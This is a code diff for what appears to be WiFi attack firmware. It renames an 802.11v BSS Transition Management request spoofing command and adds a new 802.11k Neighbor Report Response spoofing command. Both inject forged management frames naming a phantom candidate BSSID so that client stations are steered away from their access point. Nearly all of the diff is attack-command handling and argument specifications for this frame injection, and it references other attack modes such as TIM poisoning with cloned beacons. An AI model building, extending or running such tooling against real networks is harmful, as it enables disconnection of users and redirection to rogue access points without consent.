@@ -23,7 +23,8 @@
 #include "sae.h"
 #include "tim.h"
 #include "wbus.h"
-#include "wnm.h"
+#include "btm.h"
+#include "rrm.h"
 
 namespace {
 
@@ -544,90 +545,218 @@ void mac_text(const uint8_t mac[6], char out[18]) {
            mac[5]);
 }
 
-// ---- WNM (802.11v BTM Request) ----------------------------------------------
+// ---- BTM (802.11v BTM Request) ----------------------------------------------
 
-const wb_arg_spec_t kWnmStartArgs[] = {
+const wb_arg_spec_t kBtmStartArgs[] = {
     {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
      .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
-    {.name = "mode", .type = WB_T_ENUM, .flags = 0, .enums = "cand|bare",
-     .label = "cand = with a phantom candidate list, bare = without",
-     .err = "mode must be 'cand' (candidate list) or 'bare'", .def = 0, .min = 0, .max = 0},
-    // timer/ch are JUNK_ZERO so that "abc" behaves like strtol's 0 and the handler's
-    // own check (with its own wording) still runs after the index check.
     {.name = "timer", .type = WB_T_INT, .flags = 0, .enums = nullptr,
-     .label = "disassociation timer in TBTT (1..65535)", .err = nullptr, .def = 10, .min = 0,
-     .max = 0},
-    {.name = "ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
-     .label = "candidate channel 0..196 (0 = pick one)", .err = nullptr, .def = 0, .min = 0,
-     .max = 0},
+     .label = "disassociation timer in TBTT (1..65535, default 10)", .err = nullptr, .def = 10,
+     .min = 0, .max = 0},
     {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
      .label = "target station MAC (optional)", .err = "station MAC must look like AABBCCDDEEFF",
      .def = 0, .min = 0, .max = 0},
+    {.name = "cand", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
+     .label = "candidate BSSID to steer to (optional; omit = no candidate list)",
+     .err = "candidate BSSID must look like AABBCCDDEEFF", .def = 0, .min = 0, .max = 0},
+    {.name = "cand-ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "candidate channel, 0 = look it up in the scan results", .err = nullptr, .def = 0,
+     .min = 0, .max = 0},
+    {.name = "cand-info", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "BSSID Information word, 0 until a real frame says otherwise", .err = nullptr,
+     .def = 0, .min = 0, .max = 2147483647},
 };
 
-wb_err_t wnm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+wb_err_t btm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
   const int index = (int)wb_arg_num(args, "idx");
   if (index < 0 || index >= console_scan_count()) {
     wb_reply_line(reply, "ERR index out of range, run SCAN first");
     return WB_ERR_ARG;
   }
-  const wb_value_t* mode_arg = wb_arg(args, "mode");
-  const wnm_mode_t mode =
-      (mode_arg != nullptr && mode_arg->text != nullptr && strcmp(mode_arg->text, "bare") == 0)
-          ? WNM_MODE_BARE
-          : WNM_MODE_CAND;
   const long timer = wb_arg_num(args, "timer");
   if (timer < 1 || timer > 65535) {
     wb_reply_line(reply, "ERR timer must be 1..65535 TBTT (0 disables the client's scan)");
     return WB_ERR_ARG;
   }
-  const long ch = wb_arg_num(args, "ch");
-  if (ch < 0 || ch > 196) {
-    wb_reply_line(reply, "ERR candidate channel must be 0..196 (0 = pick one)");
-    return WB_ERR_ARG;
-  }
   uint8_t sta[6];
   const bool have_sta = wb_arg_mac(args, "sta", sta);
+
+  // 可选候选：给了 BSSID 就一定要有信道。0 表示"从扫描结果里按 BSSID 找"，
+  // 找不到就报错而不是瞎填一个——元素里的信道写错了，客户端扫的就是别处。
+  uint8_t cand[6];
+  const bool have_cand = wb_arg_mac(args, "cand", cand);
+  long cand_ch = wb_arg_num(args, "cand-ch");
+  const uint32_t cand_info = (uint32_t)wb_arg_num(args, "cand-info");
+  if (have_cand) {
+    if (cand_ch == 0) {
+      const int n = console_scan_count();
+      for (int i = 0; i < n; i++) {
+        const uint8_t* b = WiFi.BSSID(i);
+        if (b != nullptr && memcmp(b, cand, 6) == 0) {
+          cand_ch = WiFi.channel(i);
+          break;
+        }
+      }
+    }
+    if (cand_ch < 1 || cand_ch > 196) {
+      wb_reply_line(reply,
+                    "ERR candidate channel unknown: run SCAN while that BSS is up, or pass "
+                    "cand-ch=<1..196>");
+      return WB_ERR_ARG;
+    }
+  }
+
   attack_stop();
-  if (!wnm_start(index, mode, (uint16_t)timer, (uint8_t)ch)) {
+  if (!btm_start(index, (uint16_t)timer, have_cand ? cand : nullptr, (uint8_t)cand_ch,
+                 cand_info)) {
     wb_reply_line(reply, "ERR cannot start the BTM spoof on that network");
     return WB_ERR_STATE;
   }
   if (have_sta) {
-    wnm_add_station(sta);
+    btm_add_station(sta);
     char text[18];
     mac_text(sta, text);
-    wb_reply_printf(reply, "OK WNMSTA %s\n", text);
+    wb_reply_printf(reply, "OK BTMSTA %s\n", text);
   }
-  wb_reply_printf(reply, "OK WNM %d mode=%s timer=%u cand_ch=%u ssid=%s\n", index,
-                  wnm_mode_name(), (unsigned)timer, (unsigned)wnm_candidate_channel(),
-                  WiFi.SSID(index).c_str());
-  console_ui_log("wnm started");
-  wbus_emit("wnm.state", "active=1");
+  if (have_cand) {
+    char cand_text[18];
+    mac_text(cand, cand_text);
+    wb_reply_printf(reply, "OK BTM %d timer=%u cand=%s ch=%ld info=0x%08X ssid=%s\n", index,
+                    (unsigned)timer, cand_text, cand_ch, (unsigned)cand_info,
+                    WiFi.SSID(index).c_str());
+  } else {
+    wb_reply_printf(reply, "OK BTM %d timer=%u ssid=%s\n", index, (unsigned)timer,
+                    WiFi.SSID(index).c_str());
+  }
+  console_ui_log("btm started");
+  wbus_emit("btm.state", "active=1");
   return WB_OK;
 }
 
-wb_err_t wnm_bus_stop(const wb_args_t*, wb_reply_t* reply) {
-  const uint32_t frames = wnm_frames();
-  const uint32_t responses = wnm_responses();
-  wnm_stop();
-  wb_reply_printf(reply, "OK WNMSTOP frames=%u responses=%u last_status=%u\n", (unsigned)frames,
-                  (unsigned)responses, (unsigned)wnm_last_status());
-  console_ui_log("wnm stopped");
-  wbus_emit("wnm.state", "active=0");
+wb_err_t btm_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = btm_frames();
+  const uint32_t responses = btm_responses();
+  btm_stop();
+  wb_reply_printf(reply, "OK BTMSTOP frames=%u responses=%u last_status=%u\n", (unsigned)frames,
+                  (unsigned)responses, (unsigned)btm_last_status());
+  console_ui_log("btm stopped");
+  wbus_emit("btm.state", "active=0");
   return WB_OK;
 }
 
-wb_err_t wnm_bus_test(const wb_args_t*, wb_reply_t*) {
-  wnm_selftest();
+wb_err_t btm_bus_test(const wb_args_t*, wb_reply_t*) {
+  btm_selftest();
   return WB_OK;
 }
 
-const wb_method_t kWnmMethods[] = {
-    {.name = "start", .args = kWnmStartArgs, .n_args = 5, .handler = wnm_bus_start,
+const wb_method_t kBtmMethods[] = {
+    {.name = "start", .args = kBtmStartArgs, .n_args = 6, .handler = btm_bus_start,
      .summary = "802.11v BTM Request spoof"},
-    {.name = "stop", .args = nullptr, .n_args = 0, .handler = wnm_bus_stop, .summary = "stop the BTM spoof"},
-    {.name = "test", .args = nullptr, .n_args = 0, .handler = wnm_bus_test, .summary = "dump the BTM Request bytes"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = btm_bus_stop, .summary = "stop the BTM spoof"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = btm_bus_test, .summary = "dump the BTM Request bytes"},
+};
+
+// ---- RRM (802.11k Neighbor Report Response) ---------------------------------
+
+const wb_arg_spec_t kRrmStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+    {.name = "sub", .type = WB_T_ENUM, .flags = 0, .enums = "nbr",
+     .label = "the only subcommand for now: nbr = Neighbor Report Response",
+     .err = "subcommand must be 'nbr' (Neighbor Report Response)", .def = 0, .min = 0, .max = 0},
+    {.name = "bssid", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
+     .label = "BSSID announced as the phantom neighbour",
+     .err = "neighbour BSSID must look like AABBCCDDEEFF", .def = 0, .min = 0, .max = 0},
+    {.name = "ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "channel of the phantom neighbour, 1..196", .err = nullptr, .def = 0, .min = 0,
+     .max = 0},
+    {.name = "count", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "frames to inject in total, 0 = until RRMSTOP", .err = nullptr, .def = 1, .min = 0,
+     .max = 16},
+    {.name = "token", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "dialog token 0..255", .err = nullptr, .def = 0, .min = 0, .max = 255},
+    {.name = "info", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "BSSID Information word, 0 until a real frame says otherwise", .err = nullptr,
+     .def = 0, .min = 0, .max = 2147483647},
+    {.name = "opclass", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "operating class, 0 until a real frame says otherwise", .err = nullptr, .def = 0,
+     .min = 0, .max = 255},
+    {.name = "phy", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "PHY type, 0 until a real frame says otherwise", .err = nullptr, .def = 0, .min = 0,
+     .max = 255},
+    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
+     .label = "target station MAC (optional)", .err = "station MAC must look like AABBCCDDEEFF",
+     .def = 0, .min = 0, .max = 0},
+};
+
+wb_err_t rrm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  uint8_t cand[6];
+  if (!wb_arg_mac(args, "bssid", cand)) {
+    wb_reply_line(reply, "ERR neighbour BSSID must look like AABBCCDDEEFF");
+    return WB_ERR_ARG;
+  }
+  const long ch = wb_arg_num(args, "ch");
+  if (ch < 1 || ch > 196) {
+    wb_reply_line(reply, "ERR candidate channel must be 1..196");
+    return WB_ERR_ARG;
+  }
+  const long count = wb_arg_num(args, "count");
+  const long token = wb_arg_num(args, "token");
+  const uint32_t info = (uint32_t)wb_arg_num(args, "info");
+  const long opclass = wb_arg_num(args, "opclass");
+  const long phy = wb_arg_num(args, "phy");
+  uint8_t sta[6];
+  const bool have_sta = wb_arg_mac(args, "sta", sta);
+  attack_stop();
+  if (!rrm_start(index, cand, (uint8_t)ch, (uint8_t)count, (uint8_t)token, info, (uint8_t)opclass,
+                 (uint8_t)phy)) {
+    wb_reply_line(reply, "ERR cannot start the Neighbor Report spoof on that network");
+    return WB_ERR_STATE;
+  }
+  if (have_sta) {
+    rrm_add_station(sta);
+    char text[18];
+    mac_text(sta, text);
+    wb_reply_printf(reply, "OK RRMSTA %s\n", text);
+  }
+  char cand_text[18];
+  mac_text(cand, cand_text);
+  wb_reply_printf(reply, "OK RRM %d nbr count=%u token=%u cand=%s ch=%u info=0x%08X ssid=%s\n", index,
+                  (unsigned)count, (unsigned)token, cand_text, (unsigned)ch, (unsigned)info,
+                  WiFi.SSID(index).c_str());
+  console_ui_log("rrm started");
+  wbus_emit("rrm.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t rrm_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = rrm_frames();
+  const uint32_t clients = rrm_clients();
+  rrm_stop();
+  wb_reply_printf(reply, "OK RRMSTOP frames=%u clients=%u\n", (unsigned)frames,
+                  (unsigned)clients);
+  console_ui_log("rrm stopped");
+  wbus_emit("rrm.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t rrm_bus_test(const wb_args_t*, wb_reply_t*) {
+  rrm_selftest();
+  return WB_OK;
+}
+
+const wb_method_t kRrmMethods[] = {
+    {.name = "start", .args = kRrmStartArgs, .n_args = 10, .handler = rrm_bus_start,
+     .summary = "802.11k Neighbor Report Response spoof"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = rrm_bus_stop,
+     .summary = "stop the Neighbor Report spoof"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = rrm_bus_test,
+     .summary = "dump the Neighbor Report Response bytes"},
 };
 
 // ---- TIM poisoning ----------------------------------------------------------
@@ -1192,10 +1321,15 @@ const wb_object_t kObjects[] = {
      .methods = kBaMethods,
      .n_methods = (int)(sizeof(kBaMethods) / sizeof(kBaMethods[0])),
      .events = "state"},
-    {.name = "wnm",
+    {.name = "btm",
      .title = "802.11v BTM Request spoof",
-     .methods = kWnmMethods,
-     .n_methods = (int)(sizeof(kWnmMethods) / sizeof(kWnmMethods[0])),
+     .methods = kBtmMethods,
+     .n_methods = (int)(sizeof(kBtmMethods) / sizeof(kBtmMethods[0])),
+     .events = "state"},
+    {.name = "rrm",
+     .title = "802.11k Neighbor Report spoof",
+     .methods = kRrmMethods,
+     .n_methods = (int)(sizeof(kRrmMethods) / sizeof(kRrmMethods[0])),
      .events = "state"},
     {.name = "tim",
      .title = "TIM poisoning (cloned beacon)",
